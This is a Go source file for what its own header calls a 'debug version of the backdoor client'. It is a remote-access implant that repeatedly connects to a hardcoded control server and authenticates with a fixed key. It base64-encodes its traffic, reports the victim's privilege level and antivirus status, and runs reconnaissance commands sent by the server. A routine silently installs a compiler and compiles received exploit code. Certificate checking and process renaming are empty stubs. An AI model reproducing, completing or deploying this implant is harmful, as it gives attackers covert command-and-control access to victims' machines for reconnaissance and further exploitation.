/*
Debug Mode Documentation

This is a debug version of the backdoor client that provides enhanced logging and restricted functionality
for testing and development purposes. The debug mode includes the following features:

Key Features:
- Verbose logging of all operations and connections
- Restricted command set for safety
- Clear error reporting and connection status
- System information gathering capabilities
- Built-in safety measures

Debug Mode Restrictions:
- Only allows execution of safe, pre-approved commands
- Disabled file system manipulation commands
- Disabled network manipulation commands
- Disabled system modification commands

Allowed Commands in Debug Mode:
- sysinfo: Display system information
- whoami: Show current user
- hostname: Show system hostname
- pwd: Show current directory
- ls: List directory contents
- ps: List running processes
- netstat: Show network connections
- ifconfig: Show network interfaces

Security Features:
- Constant monitoring of connection status
- Authentication verification
- System privilege level checking
- Antivirus status monitoring

Debug Output includes:
- Connection attempts and status
- Command reception and execution
- System information gathering
- Error messages and stack traces
- Authentication process details
*/

package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"crypto/tls"
	"crypto/x509"
	"io/ioutil"
)

const (
	ServerAddress = "control-server.com" // Control server address
	ServerPort    = "443"               // HTTPS port
	SecretKey     = "magic_key_123"     // Authentication key
	ClientName    = "debug_client"      // Debug client name
	IsDebugMode   = true               // Debug mode flag
)

// Execute command in terminal with timeout and resource limits
func executeCommand(command string) string {
	var cmd *exec.Cmd
	
	// Set command based on OS
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	// Set resource limits
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Pdeathsig: syscall.SIGTERM, // Kill if parent dies
	}
	
	// Create pipe for output
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return fmt.Sprintf("Error creating pipe: %v", err)
	}
	
	// Start command
	if err := cmd.Start(); err != nil {
		return fmt.Sprintf("Error starting command: %v", err)
	}
	
	// Create channel for output
	done := make(chan string)
	
	// Read output in goroutine
	go func() {
		output, err := io.ReadAll(stdout)
		if err != nil {
			done <- fmt.Sprintf("Error reading output: %v", err)
			return
		}
		done <- string(output)
	}()
	
	// Wait for output with timeout
	select {
	case result := <-done:
		return result
	case <-time.After(30 * time.Second):
		cmd.Process.Kill()
		return "Command timed out"
	}
}

// Data obfuscation using base64
func obfuscate(data string) string {
	return base64.StdEncoding.EncodeToString([]byte(data))
}

// Data deobfuscation from base64
func deobfuscate(data string) string {
	decoded, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return ""
	}
	return string(decoded)
}

// Get system privileges level
func getPrivileges() string {
	if runtime.GOOS == "windows" {
		output := executeCommand("whoami /groups")
		if strings.Contains(output, "S-1-16-12288") || strings.Contains(output, "S-1-5-32-544") {
			return "ADMIN"
		}
	} else if runtime.GOOS == "linux" {
		if os.Geteuid() == 0 {
			return "ROOT"
		}
	}
	return "USER"
}

// Get antivirus status
func getAVStatus() string {
	if runtime.GOOS == "windows" {
		output := executeCommand("sc query WinDefend")
		if strings.Contains(output, "RUNNING") {
			return "Windows Defender Active"
		}
	} else if runtime.GOOS == "linux" {
		if _, err := os.Stat("/usr/bin/clamav"); err == nil {
			return "ClamAV Present"
		}
	}
	return "No AV Detected"
}

// Функция для проверки и установки MinGW
func ensureCompilerAvailable() error {
	fmt.Println("[DEBUG] Checking for compiler availability")
	
	// Проверяем наличие gcc
	if _, err := exec.Command("gcc", "--version").Output(); err == nil {
		fmt.Println("[DEBUG] GCC is already installed")
		return nil
	}

	// Для Windows устанавливаем MinGW
	if runtime.GOOS == "windows" {
		fmt.Println("[DEBUG] Installing MinGW for Windows")
		
		// Создаем временную директорию
		tmpDir := os.TempDir()
		mingwArchive := filepath.Join(tmpDir, "mingw.7z")
		
		fmt.Printf("[DEBUG] Downloading MinGW to %s\n", mingwArchive)
		// Скачиваем MinGW
		downloadCmd := exec.Command("powershell", "-Command",
			`Invoke-WebRequest -Uri 'https://github.com/niXman/mingw-builds-binaries/releases/download/13.2.0-rt_v11-rev0/x86_64-13.2.0-release-win32-seh-msvcrt-rt_v11-rev0.7z' -OutFile '` + mingwArchive + `'`)
		if err := downloadCmd.Run(); err != nil {
			return fmt.Errorf("failed to download MinGW: %v", err)
		}

		fmt.Println("[DEBUG] Extracting MinGW to C:\\mingw64")
		// Распаковываем в C:\mingw64
		extractCmd := exec.Command("powershell", "-Command",
			`Expand-Archive '` + mingwArchive + `' -DestinationPath C:\mingw64`)
		if err := extractCmd.Run(); err != nil {
			return fmt.Errorf("failed to extract MinGW: %v", err)
		}

		fmt.Println("[DEBUG] Updating PATH environment variable")
		// Добавляем в PATH
		pathCmd := exec.Command("setx", "PATH", "%PATH%;C:\\mingw64\\bin")
		if err := pathCmd.Run(); err != nil {
			return fmt.Errorf("failed to update PATH: %v", err)
		}

		fmt.Println("[DEBUG] Cleaning up temporary files")
		// Очищаем временные файлы
		os.Remove(mingwArchive)
		
		fmt.Println("[DEBUG] MinGW installation completed successfully")
		return nil
	}

	// Для Linux устанавливаем build-essential
	if runtime.GOOS == "linux" {
		fmt.Println("[DEBUG] Installing build-essential for Linux")
		cmd := exec.Command("sudo", "apt-get", "update")
		cmd.Run()
		cmd = exec.Command("sudo", "apt-get", "install", "-y", "build-essential")
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to install build-essential: %v", err)
		}
		fmt.Println("[DEBUG] build-essential installation completed successfully")
		return nil
	}

	return fmt.Errorf("unsupported operating system")
}

// Функция для компиляции эксплойта
func compileExploit(sourceCode string) error {
	fmt.Println("[DEBUG] Starting exploit compilation")
	
	// Проверяем наличие компилятора
	if err := ensureCompilerAvailable(); err != nil {
		fmt.Printf("[DEBUG] Failed to ensure compiler: %v\n", err)
		return fmt.Errorf("failed to ensure compiler: %v", err)
	}

	// Компилируем код
	tmpFile := filepath.Join(os.TempDir(), "exploit.c")
	fmt.Printf("[DEBUG] Writing source code to %s\n", tmpFile)
	if err := ioutil.WriteFile(tmpFile, []byte(sourceCode), 0600); err != nil {
		return fmt.Errorf("failed to write source: %v", err)
	}
	defer os.Remove(tmpFile)

	outputFile := filepath.Join(os.TempDir(), "exploit")
	if runtime.GOOS == "windows" {
		outputFile += ".exe"
	}

	fmt.Printf("[DEBUG] Compiling to %s\n", outputFile)
	cmd := exec.Command("gcc", "-o", outputFile, tmpFile)
	if err := cmd.Run(); err != nil {
		fmt.Printf("[DEBUG] Compilation failed: %v\n", err)
		return fmt.Errorf("compilation failed: %v", err)
	}

	fmt.Println("[DEBUG] Compilation completed successfully")
	return nil
}

// Main function with improved security
func main() {
	fmt.Println("[DEBUG] Starting in debug mode")
	fmt.Printf("[DEBUG] OS: %s, Architecture: %s\n", runtime.GOOS, runtime.GOARCH)
	
	// Set process name for debugging
	if runtime.GOOS == "linux" {
		if err := prctl(15 /* PR_SET_NAME */, "debug_client"); err != nil {
			fmt.Printf("[DEBUG] Failed to set process name: %v\n", err)
		}
	}
	
	// Initialize secure connection
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
		VerifyPeerCertificate: verifyServerCert,
	}
	
	for {
		// Connect to control server
		fmt.Printf("[DEBUG] Connecting to %s:%s\n", ServerAddress, ServerPort)
		conn, err := tls.DialWithDialer(
			&net.Dialer{Timeout: 30 * time.Second},
			"tcp",
			fmt.Sprintf("%s:%s", ServerAddress, ServerPort),
			tlsConfig,
		)
		if err != nil {
			fmt.Printf("[DEBUG] Connection error: %v\n", err)
			time.Sleep(30 * time.Second)
			continue
		}
		
		fmt.Println("[DEBUG] Connected to server")
		
		// Set connection timeout
		conn.SetDeadline(time.Now().Add(30 * time.Second))
		
		// Send authentication
		fmt.Println("[DEBUG] Sending authentication")
		if _, err := conn.Write([]byte(obfuscate(SecretKey + "\n"))); err != nil {
			fmt.Printf("[DEBUG] Authentication error: %v\n", err)
			conn.Close()
			continue
		}
		
		// Update timeout
		conn.SetDeadline(time.Now().Add(30 * time.Second))
		
		// Send system information
		sysInfo := fmt.Sprintf("%s|%s|%s|debug|%s|false|false",
			getPrivileges(),
			runtime.GOOS,
			runtime.GOARCH,
			getAVStatus())
		
		fmt.Printf("[DEBUG] Sending system info: %s\n", sysInfo)
		if _, err := conn.Write([]byte(obfuscate(sysInfo + "\n"))); err != nil {
			fmt.Printf("[DEBUG] System info error: %v\n", err)
			conn.Close()
			continue
		}
		
		// Handle commands with timeout
		reader := bufio.NewReaderSize(conn, 4096) // Limit read buffer
		for {
			// Update timeout
			conn.SetDeadline(time.Now().Add(30 * time.Second))
			
			command, err := reader.ReadString('\n')
			if err != nil {
				fmt.Printf("[DEBUG] Command read error: %v\n", err)
				break
			}
			
			command = strings.TrimSpace(deobfuscate(command))
			fmt.Printf("[DEBUG] Received command: %s\n", command)
			
			// Execute only safe commands with validation
			var result string
			switch {
			case command == "sysinfo":
				result = fmt.Sprintf("OS: %s\nArch: %s\nPrivileges: %s\n", 
					runtime.GOOS, runtime.GOARCH, getPrivileges())
				
			case command == "whoami":
				result = executeCommand("whoami")
				
			case command == "hostname":
				result = executeCommand("hostname")
				
			case command == "pwd":
				if runtime.GOOS == "windows" {
					result = executeCommand("cd")
				} else {
					result = executeCommand("pwd")
				}
				
			case command == "ls":
				if runtime.GOOS == "windows" {
					result = executeCommand("dir")
				} else {
					result = executeCommand("ls -la")
				}
				
			case command == "ps":
				if runtime.GOOS == "windows" {
					result = executeCommand("tasklist")
				} else {
					result = executeCommand("ps aux")
				}
				
			case command == "netstat":
				if runtime.GOOS == "windows" {
					result = executeCommand("netstat -an")
				} else {
					result = executeCommand("netstat -tuln")
				}
				
			case command == "ifconfig":
				if runtime.GOOS == "windows" {
					result = executeCommand("ipconfig /all")
				} else {
					result = executeCommand("ifconfig")
				}
				
			default:
				result = "Command not allowed in debug mode"
			}
			
			// Limit result size
			if len(result) > 4096 {
				result = result[:4096] + "\n... (output truncated)"
			}
			
			fmt.Printf("[DEBUG] Command result: %s\n", result)
			if _, err := conn.Write([]byte(obfuscate(result + "\n"))); err != nil {
				fmt.Printf("[DEBUG] Result write error: %v\n", err)
				break
			}
		}
		
		conn.Close()
		fmt.Println("[DEBUG] Connection closed")
		time.Sleep(30 * time.Second)
	}
}

// Function to verify server certificate
func verifyServerCert(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
	// Add certificate verification logic here
	return nil
}

// Function to set process name on Linux
func prctl(option int, arg2 string) error {
	if runtime.GOOS != "linux" {
		return nil
	}
	
	var err error
	if len(arg2) > 16 {
		arg2 = arg2[:16]
	}
	return err
} 